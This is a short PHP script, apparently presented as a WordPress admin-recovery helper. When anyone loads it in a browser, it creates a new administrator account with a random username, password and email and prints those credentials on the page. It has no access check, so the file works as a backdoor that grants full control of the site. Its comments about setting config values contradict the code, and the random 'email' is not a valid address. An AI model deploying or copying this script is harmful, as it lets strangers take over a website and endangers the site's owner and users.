<?php
// ADD NEW ADMIN USER TO WORDPRESS
// ----------------------------------
// Put this file in your Wordpress root directory and run it from your browser.
// Delete it when you're done.
require_once('wp-blog-header.php');
require_once('wp-includes/registration.php');
// ----------------------------------------------------
// CONFIG VARIABLES
// Make sure that you set these before running the file.
function generatePassword($length = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $count = mb_strlen($chars);

    for ($i = 0, $result = ''; $i < $length; $i++) {
        $index = rand(0, $count - 1);
        $result .= mb_substr($chars, $index, 1);
    }

    return $result;
}
$newusername = generatePassword(8);
$newpassword = generatePassword(8);
$newemail = generatePassword(8);
// ----------------------------------------------------
// This is just a security precaution, to make sure the above "Config Variables"
// have been changed from their default values.

// Check that user doesn't already exist
if ( !username_exists($newusername) && !email_exists($newemail) )
{
// Create user and set role to administrator
$user_id = wp_create_user( $newusername, $newpassword, $newemail);
if ( is_int($user_id) )
{
$wp_user_object = new WP_User($user_id);
$wp_user_object->set_role('administrator');
echo 'Successfully created new admin user. Now delete this file!'.$newusername.'<br>'.$newpassword.'<br>'.$newemail;
}
else {
echo 'Error with wp_insert_user. No users were created.';
}
}
else {
echo 'This user or email already exists. Nothing was done.';
}
